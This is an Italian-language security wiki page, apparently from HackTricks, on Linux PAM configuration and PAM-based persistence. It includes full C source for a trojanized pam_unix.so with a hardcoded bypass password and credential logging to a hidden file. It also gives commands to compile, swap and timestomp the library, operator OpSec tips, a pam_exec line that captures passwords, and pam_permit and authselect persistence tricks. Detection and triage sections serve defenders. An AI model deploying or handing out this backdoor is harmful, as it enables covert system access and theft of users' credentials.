# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Informazioni di base

**PAM (Pluggable Authentication Modules)** agisce come meccanismo di sicurezza che **verifica l'identità degli utenti che tentano di accedere ai servizi del computer**, controllandone l'accesso in base a diversi criteri. È come un guardiano digitale, che garantisce che solo gli utenti autorizzati possano utilizzare servizi specifici, limitandone eventualmente l'uso per evitare il sovraccarico del sistema.

#### File di configurazione

- **Solaris** supporta il file centrale legacy `/etc/pam.conf`, ma le linee guida attuali preferiscono i file dei servizi in `/etc/pam.d`.<sup>[[10]](#references)</sup>
- **I sistemi Linux** preferiscono un approccio basato su directory, archiviando le configurazioni specifiche dei servizi in `/etc/pam.d`. Ad esempio, il file di configurazione del servizio login si trova in `/etc/pam.d/login`.<sup>[[1]](#references)</sup>

Un esempio di configurazione PAM per il servizio login potrebbe essere simile al seguente:

```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```

#### **Ambiti di gestione PAM**

Questi ambiti, o gruppi di gestione, includono **auth**, **account**, **password** e **session**, ciascuno responsabile di aspetti diversi del processo di autenticazione e gestione delle sessioni:<sup>[[1]](#references)</sup>

- **Auth**: verifica l'identità dell'utente, spesso richiedendo una password.
- **Account**: gestisce la verifica dell'account, controllando condizioni come l'appartenenza a un gruppo o le restrizioni in base all'ora del giorno.
- **Password**: gestisce gli aggiornamenti delle password, inclusi i controlli di complessità e la prevenzione degli attacchi a dizionario.
- **Session**: gestisce le azioni all'avvio o alla chiusura di una sessione di servizio, come il montaggio di directory o l'impostazione dei limiti delle risorse.

#### **Controlli dei moduli PAM**

I controlli determinano la risposta del modulo in caso di successo o errore e influenzano il processo complessivo di autenticazione. Includono:<sup>[[1]](#references)</sup>

- **Required**: il fallimento di un modulo required comporta un errore finale, ma solo dopo che sono stati controllati tutti i moduli successivi.
- **Requisite**: terminazione immediata del processo in caso di errore.
- **Sufficient**: se nessun modulo `required` precedente è fallito, il successo restituisce immediatamente un esito positivo e salta i moduli rimanenti nello stesso gruppo di gestione.
- **Optional**: causa un errore solo se è l'unico modulo nello stack.

#### Semantica offensiva rilevante

Quando si analizza o modifica PAM, la **posizione di una regola inserita** determina quale stack la applica:<sup>[[1]](#references)[[13]](#references)</sup>

- `include` e `substack` importano regole da altri file: modificare `sshd` potrebbe quindi influire solo su SSH, mentre modificare `system-auth`, `common-auth` o un altro stack condiviso può influire su più servizi contemporaneamente.<sup>[[1]](#references)[[13]](#references)</sup>
- PAM supporta anche controlli tra parentesi quadre come `[success=1 default=ignore]`. Questi possono essere abusati per **saltare uno o più moduli** dopo il successo di un controllo personalizzato, invece di sostituire in modo visibile `pam_unix.so`.<sup>[[1]](#references)</sup>
- Il `module-path` può essere **assoluto** (`/usr/lib/security/pam_custom.so`) o **relativo** alla directory predefinita dei moduli PAM. Nei sistemi Linux moderni, le directory effettive sono spesso `/lib/security`, `/lib64/security`, `/usr/lib/security` o percorsi multiarch come `/usr/lib/x86_64-linux-gnu/security`.<sup>[[1]](#references)[[14]](#references)</sup>

Indicazione rapida per gli operatori: mappare sempre il **grafo completo dei servizi** prima di applicare modifiche. Per esempio, `sshd -> password-auth -> system-auth` su alcune distro oppure `sshd -> system-remote-login -> system-login -> system-auth` su altre significa che lo stesso impianto di una sola riga può avere una portata molto più ampia del previsto.<sup>[[1]](#references)[[13]](#references)</sup>

Un modulo `auth` personalizzato può aggiungere a `sudo` una richiesta interattiva dopo la password dell'account. Prima di esaminare manualmente la richiesta, controllare lo stack effettivo di `/etc/pam.d/sudo`, le policy incluse, gli argomenti dei moduli e i permessi di qualsiasi file di dati locale citato. Una wordlist della richiesta leggibile, da sola, non aggira il controllo della password e non crea un'autorizzazione sudoers. Per una transizione privilegiata servono comunque l'autenticazione corretta dell'account, il completamento di ogni passaggio PAM required e una regola sudo che consenta l'accesso root; l'enumerazione non presidiata non dovrebbe attivare la richiesta.

Per la vulnerabilità legacy di Ubuntu [`pam_motd` ownership flaw (CVE-2010-0832)](https://ubuntu.com/security/cve-2010-0832), verificare la build effettiva di `libpam-modules` e se un servizio di login richiama il modulo session interessato. Ubuntu ha corretto il problema nelle versioni **1.1.0-2ubuntu1.1** per la 9.10 e **1.1.1-2ubuntu5** per la 10.04 LTS; altre release o backport del fornitore richiedono una valutazione specifica dei pacchetti. Il percorso segnalato richiedeva che l'utente sostituisse la propria `.cache` nella home con un symlink e poi avviasse un login PAM, facendo sì che il vecchio modulo modificasse la proprietà di un target protetto. Una voce `.cache`, una riga `pam_motd.so` o una vecchia versione del kernel, da sole, non dimostrano l'esposizione; verificare il controllo della home directory, la versione effettiva del modulo, la raggiungibilità del login, la gestione dei symlink e i permessi del target, senza sostituire file né avviare un login durante l'enumerazione passiva. Consultare l'[avviso di sicurezza di Ubuntu](https://ubuntu.com/security/notices/USN-959-1).

#### Esempio di scenario

In una configurazione con più moduli auth, il processo segue un ordine rigoroso. Se il modulo `pam_securetty` rileva che il terminale di login non è autorizzato, i login root vengono bloccati, ma tutti i moduli vengono comunque elaborati a causa dello stato "required" del modulo. `pam_env` imposta variabili d'ambiente, con possibili vantaggi per l'esperienza utente. I moduli `pam_ldap` e `pam_unix` collaborano per autenticare l'utente; `pam_unix` prova a usare una password fornita in precedenza, migliorando l'efficienza e la flessibilità dei metodi di autenticazione.<sup>[[1]](#references)[[13]](#references)[[15]](#references)[[16]](#references)[[17]](#references)</sup>


## `pam_permit` in uno stack di servizio

`pam_permit.so` restituisce esito positivo per i controlli PAM. Se un utente con privilegi inferiori può modificare la policy PAM effettiva di un servizio, inserirvi questo modulo con un control flag che interrompe anticipatamente lo stack di autenticazione può rimuovere il controllo della password per quel servizio. Per `sudo`, esaminare `/etc/pam.d/sudo` e gli eventuali file `common-auth` o `system-auth` inclusi prima di stabilire quali servizi siano interessati. Un bypass dell'autenticazione PAM **non** concede una nuova regola sudoers: l'utente deve comunque essere autorizzato a eseguire il comando richiesto. Controllare l'ordine delle regole e gli eventuali errori `required` precedenti, invece di presumere che una singola riga `sufficient pam_permit.so` abbia sempre successo.

## Backdoor di PAM – hooking di `pam_unix.so`

Un classico trucco di persistenza in ambienti Linux di alto valore consiste nel **sostituire la libreria PAM legittima con una versione drop-in trojanizzata**. Su un host il cui stack PAM carica `pam_unix.so`, l'autenticazione SSH o da console può invocarne l'entry point `pam_sm_authenticate()`; una sostituzione malevola può catturare le credenziali o implementare un bypass tramite password *magica*.<sup>[[2]](#references)[[11]](#references)</sup>

### Promemoria per la compilazione
Lo schema seguente usa l'entry point di servizio `pam_sm_authenticate()` di Linux-PAM e `pam_get_authtok()` per accedere al token di autenticazione.<sup>[[11]](#references)[[12]](#references)</sup>
<details>
<summary>Esempio di trojan `pam_unix.so`</summary>

```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <security/pam_ext.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <string.h>
#include <unistd.h>

static void *real_module;
static int (*orig_auth)(pam_handle_t *, int, int, const char **);
static int (*orig_setcred)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

static int load_original(void) {
    if (real_module) return 0;
    real_module = dlopen("/lib/security/pam_unix.so.bak", RTLD_NOW | RTLD_LOCAL);
    if (!real_module) return -1;
    orig_auth = dlsym(real_module, "pam_sm_authenticate");
    orig_setcred = dlsym(real_module, "pam_sm_setcred");
    return (orig_auth && orig_setcred) ? 0 : -1;
}

PAM_EXTERN int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    const char *user = NULL, *pass = NULL;
    pam_get_user(pamh, &user, NULL);
    pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    /* Magic pwd → immediate success */
    if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

    /* Credential harvesting */
    if (user && pass) {
        int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
        if (fd >= 0) {
            dprintf(fd, "%s:%s\n", user, pass);
            close(fd);
        }
    }

    /* Forward to the renamed original module. */
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_auth(pamh, flags, argc, argv);
}

PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags, int argc, const char **argv) {
    if (load_original() != 0) return PAM_SYSTEM_ERR;
    return orig_setcred(pamh, flags, argc, argv);
}
```

</details>

Compila e sostituisci furtivamente (il pattern di sostituzione/timestomp è documentato da Unit 42). Modifica sia il percorso di backup codificato nell’wrapper sia i comandi seguenti in modo che corrispondano alla directory effettiva dei moduli PAM del target:<sup>[[2]](#references)</sup>
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```

### Suggerimenti OpSec
1. **Sovrascrittura atomica** – scrivi una libreria completa in un file temporaneo e rinominalo nella posizione definitiva per evitare di lasciare un modulo di autenticazione scritto solo parzialmente.
2. In un'analisi di AuthDoor di Unit 42 è stato osservato un percorso come `/usr/bin/.dbus.log`, quindi è anche un indicatore utile per l'hunting.<sup>[[2]](#references)</sup>
3. Mantieni gli entry point previsti dallo stack PAM (ad esempio, `pam_sm_authenticate` e `pam_sm_setcred`) affinché le altre operazioni di gestione continuino a funzionare.<sup>[[11]](#references)[[18]](#references)</sup>

### Rilevamento
Per i controlli di integrità dei pacchetti, RPM verifica i metadati dei file installati, `debsums -s` segnala errori di checksum e `dpkg -S` nel blocco di triage interroga la proprietà dei pacchetti; la sintassi di audit watch registra le scritture e le modifiche agli attributi di un percorso.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[9]](#references)</sup>
* Confronta l'MD5/SHA256 di `pam_unix.so` con quello del pacchetto della distribuzione.
* Usa `rpm -V pam` o `debsums -s libpam-modules` per individuare librerie sostituite senza calcolare manualmente gli hash.
* Verifica la presenza di permessi di scrittura per tutti o di proprietari insoliti in `/lib/security/`.
* Regola `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Cerca nei file di configurazione PAM moduli imprevisti: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

Quella ricerca con `pam_` non rileva i moduli personalizzati con altri nomi di file `.so`. Esamina le righe **attive** `auth`, `account`, `password` e `session` in `/etc/pam.d` (e in `/etc/pam.conf`, se usato), compresi i relativi control flag e gli eventuali stack inclusi. Un modulo sconosciuto inserito come `auth sufficient` prima del normale controllo della password richiede una verifica della proprietà del pacchetto e del binario; la [sintassi di controllo di PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html) può consentire al successo di terminare anticipatamente quella parte dello stack. Il nome di un modulo, un timestamp insolito o l'opzione `nodelay`, da soli, non dimostrano un bypass. Se il comportamento suggerisce un timing leak, esamina prima l'implementazione e la raggiungibilità del servizio; le normali attività di enumerazione non dovrebbero inviare ripetutamente tentativi di autenticazione.

### Comandi rapidi di triage (dopo una compromissione o per la threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
    dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```

### Abuso di `pam_exec` per la persistenza
Invece di sostituire `pam_unix.so`, un intervento meno invasivo consiste nell’aggiungere una riga `pam_exec` in `/etc/pam.d/sshd`, in modo che un’invocazione che raggiunge quella riga PAM esegua un helper, lasciando intatto il normale stack.<sup>[[4]](#references)</sup>
```bash
# Run during the auth phase; expose_authtok sends the token on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` riceve metadati PAM in variabili d'ambiente come `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` e `PAM_TYPE`. Con `expose_authtok`, l'helper può leggere fino a `PAM_MAX_RESP_SIZE` byte della password da `stdin` durante le fasi `auth` o `password`. Se vuoi che l'helper venga eseguito con l'UID effettivo invece di quello reale, aggiungi `seteuid`.<sup>[[4]](#references)</sup>

Seguono note pratiche sui tipi di modulo e sul filtro `type=` documentati per `pam_exec`:<sup>[[4]](#references)</sup>

- `session optional pam_exec.so ...` è preferibile per **azioni successive al login**, come riaprire socket o avviare un daemon scollegato.
- `auth optional pam_exec.so quiet expose_authtok ...` è la scelta abituale per la **cattura delle credenziali**, perché viene eseguito prima dell'apertura della sessione.
- Si può usare `type=session` o `type=auth` per limitare l'esecuzione a una specifica fase PAM ed evitare una doppia esecuzione indesiderata.

Per verificare i privilegi, un percorso assoluto dell'helper `pam_exec.so` scrivibile dall'utente corrente è un candidato anche quando il file è contrassegnato come append-only (`a`): [l'attributo consente l'aggiunta di contenuti](https://man7.org/linux/man-pages/man1/chattr.1.html), il che può bastare a modificare il comportamento successivo di uno script shell. Verifica prima che il servizio PAM e l'evento raggiungano effettivamente quella riga, che l'helper e il percorso delle directory che lo contiene siano attendibili e che il comando venga eseguito con un'identità più privilegiata; [`seteuid` modifica l'UID PAM utilizzato](https://man7.org/linux/man-pages/man8/pam_exec.8.html). Un file scrivibile o il solo risultato di `lsattr` non dimostrano l'esecuzione con privilegi elevati.

### Sopravvivere agli strumenti della distro: `authselect`

Sui sistemi della famiglia RHEL e Fedora che usano `authselect`, le modifiche dirette a file generati come `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth` potrebbero essere **sovrascritte da `authselect`**. Per mantenere le modifiche, gli operatori spesso modificano il profilo personalizzato attivo in `/etc/authselect/custom/<profile>/` e poi lo selezionano nuovamente.<sup>[[5]](#references)[[19]](#references)</sup>

Flusso di lavoro tipico con accesso root:<sup>[[5]](#references)</sup>

```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Regenerate the PAM files after modifying the active custom profile
authselect apply-changes
```

Questo è importante sia per l'offense che per il triage: se `/etc/pam.d/system-auth` contiene il banner `Generated by authselect` e `Do not modify this file manually`, il vero punto di persistenza potrebbe trovarsi in `/etc/authselect/custom/` anziché in `/etc/pam.d/`.<sup>[[5]](#references)</sup>

### Tradecraft recente osservato sul campo

Le recenti segnalazioni del 2025 sul backdoor Linux **Plague** hanno mostrato la stessa idea di base, portata oltre: un componente PAM malevolo con una **password di bypass statica**, oltre alla pulizia delle variabili d'ambiente relative a SSH e della cronologia della shell (`HISTFILE=/dev/null`) per ridurre le tracce della sessione dopo il login.<sup>[[3]](#references)</sup> È un pattern utile per la ricerca delle minacce, perché la logica del backdoor potrebbe risiedere in PAM mentre gli artefatti di stealth compaiono solo **dopo** l'autenticazione riuscita.


## References

- [1] [pam.conf(5) / pam.d(5) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [2] [Il manuale dell'operatore occulto: infiltrazione delle reti di telecomunicazioni globali - Unit 42](https://unit42.paloaltonetworks.com/infiltration-of-global-telecom-networks/)
- [3] [Nextron Systems - Plague: un backdoor basato su PAM per Linux appena scoperto](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)
- [4] [pam_exec(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_exec.8.html)
- [5] [Configurare l'autenticazione degli utenti con authselect - Red Hat Enterprise Linux](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/10/html/configuring_authentication_and_authorization_in_rhel/configuring-user-authentication-using-authselect)
- [6] [rpm(8) - RPM](https://rpm.org/docs/4.20.x/man/rpm.8)
- [7] [debsums(1) - Pagine man di Debian](https://manpages.debian.org/unstable/debsums/debsums.1.en.html)
- [8] [auditctl(8) - Pagina del manuale Linux](https://man7.org/linux/man-pages/man8/auditctl.8.html)
- [9] [dpkg-query(1) - Pagine man di Debian](https://manpages.debian.org/testing/dpkg/dpkg-query.1.en.html)
- [10] [Gestione dell'autenticazione in Oracle Solaris 11.4](https://docs.oracle.com/cd/E37838_01/pdf/E67470.pdf)
- [11] [pam_sm_authenticate(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_authenticate.3.html)
- [12] [pam_get_authtok(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_get_authtok.3.html)
- [13] [Guida all'autenticazione a livello di sistema - Red Hat Enterprise Linux 7](https://docs.redhat.com/en/documentation/red_hat_enterprise_linux/7/html-single/system-level_authentication_guide/index)
- [14] [Elenco dei file del pacchetto Ubuntu: libpam-modules/noble/amd64](https://packages.ubuntu.com/noble/amd64/libpam-modules/filelist)
- [15] [pam_env(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_env.8.html)
- [16] [pam_unix(8) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man8/pam_unix.8.html)
- [17] [pam_ldap(5) - Pagine man di Debian](https://manpages.debian.org/testing/libpam-ldap/pam_ldap.5.en.html)
- [18] [pam_sm_setcred(3) - Manuale Linux-PAM](https://man7.org/linux/man-pages/man3/pam_sm_setcred.3.html)
- [19] [Modifiche/Impostare authselect come obbligatorio - Wiki del progetto Fedora](https://fedoraproject.org/wiki/Changes/Make_Authselect_Mandatory)
{{#include ../../banners/hacktricks-training.md}}
